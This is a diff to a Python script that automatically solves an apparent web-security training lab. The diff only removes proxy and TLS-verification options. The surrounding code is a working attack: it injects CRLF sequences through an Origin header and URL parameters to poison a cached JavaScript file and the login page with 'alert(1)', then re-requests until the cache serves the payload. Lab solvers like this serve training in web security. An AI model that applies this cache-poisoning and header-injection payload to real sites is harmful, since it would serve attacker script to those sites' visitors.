@@ -14,10 +14,10 @@ class LabSolver:
             'Origin': 'x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$',
             'Pragma': 'x-get-cache-key'
         }
-        response = self.session.get(self.lab_url + 'js/localize.js?lang=en?utm_content=z&cors=1', headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url + 'js/localize.js?lang=en?utm_content=z&cors=1', headers=headers)
         while True:
             if 'alert(1)' not in response.text:
-                response = self.session.get(self.lab_url + 'js/localize.js?lang=en?utm_content=z&cors=1', headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+                response = self.session.get(self.lab_url + 'js/localize.js?lang=en?utm_content=z&cors=1', headers=headers)
             else:
                 break
 
@@ -25,15 +25,15 @@ class LabSolver:
         headers = {
             'Pragma': 'x-get-cache-key'
         }
-        response = self.session.get(self.lab_url + 'login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23', headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url + 'login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23', headers=headers)
         while True:
             if 'alert(1)' not in response.text:
-                response = self.session.get(self.lab_url + 'login?lang=en?utm_content=x%26cors=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23', headers=headers, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+                response = self.session.get(self.lab_url + 'login?lang=en?utm_content=x%26cors=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23', headers=headers)
             else:
                 break
 
     def check_solution(self):
-        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url)
         if 'Congratulations, you solved the lab!' in response.text:
             print('You solved the lab.')
             print('Coded by Mohamed Ahmed (ma4747gh).')
